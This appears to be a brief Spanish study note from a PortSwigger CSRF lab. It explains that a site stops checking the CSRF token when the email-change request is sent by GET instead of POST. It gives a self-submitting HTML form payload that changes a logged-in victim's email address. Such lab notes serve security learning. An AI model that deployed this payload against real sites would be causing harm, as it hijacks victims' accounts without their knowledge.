# CSRF con token validado según el método HTTP

Tags: #CSRF #PortSwigger #XSRF 


```bash 
No se necesita el CSRF token de la víctima para poder cambiar el correo ya que al cambiar el método de POST a GET este no lo solicita 
```

```HTML 
<form class="login-form" name="change-email-form" action="https://web.com/my-account/change-email" method="GET">
	<input type="hidden" name="email" value="hacked@hacked.com">
</form>

<script>
	document.forms[0].submit();     // Hacer que se envie automaticamente 
</script>
```